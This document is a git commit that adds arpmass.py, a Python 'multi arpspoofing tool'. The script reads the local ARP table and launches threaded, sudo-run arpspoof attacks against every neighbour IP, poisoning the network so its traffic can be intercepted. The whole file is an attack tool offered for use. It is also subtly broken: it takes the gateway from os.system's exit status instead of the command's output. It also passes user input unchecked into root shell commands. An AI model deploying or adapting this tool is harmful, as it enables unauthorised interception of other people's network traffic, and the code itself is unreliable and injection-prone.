7d4271877e14264f8843e093e46184a9fe4b5192
i1409 <israel.14@outlook.com>
2021-05-03 11:54:51 -0500

    first

---
+++ arpmass.py
@@ -0,0 +1,54 @@
+#!/usr/bin/env python3
+
+from colorama import init, Fore, Back, Style
+import rlcompleter,gnureadline
+import threading
+from argparse import ArgumentParser
+import os
+
+banner="""
+
+    _ __                              
+   (_) /_  __  ______  ___  ______  __
+  / / __ \/ / / / __ \/ _ \/ ___/ |/_/
+ / / / / / /_/ / /_/ /  __/ /  _>  <  
+/_/_/ /_/\__, / .___/\___/_/  /_/|_|  
+        /____/_/                      
+
+Multi arpspoofing tool....
+"""
+
+def set_neigh(iface):
+    try:
+        arp_cmd="""sudo /bin/bash -c 'arp -i {} | cut -d " " -f1 | grep -E "\." > ips.txt'""".format(iface)
+        os.system(arp_cmd)
+    except Exception as err:
+        print('Something went wrong about the CMD sintax')
+        exit()
+
+def get_neigh(iface,gw):
+    f_ips=open('ips.txt','r')
+    threads=[]
+    for ip in f_ips:
+        print(Fore.WHITE+'----------------------')
+        print(ip.strip() + Fore.GREEN+" Found")
+        new_thread=threading.Thread(target=spoof, args=(iface,ip,gw))
+        threads.append(new_thread)
+        new_thread.start()
+
+def spoof(iface,ip,gw):
+    try:
+        spoof_cmd=""" sudo /bin/bash -c 'arpspoof -i {} -t {} -r {}' """.format(iface,ip,gw)
+        os.system(spoof_cmd)
+    except Exception as err:
+        print(err)
+        pass
+
+if __name__=='__main__':
+    print(banner)
+    iface = input("Enter the interface name to use-> ".strip())
+    gw_cmd="""ip route sh | grep default | grep {} | cut -d " " -f 3""".format(iface)
+    gw = os.system(gw_cmd)
+    print('READING ARP TABLE\n++++++++++++++++++++++')
+    set_neigh(iface)
+    get_neigh(iface,gw)
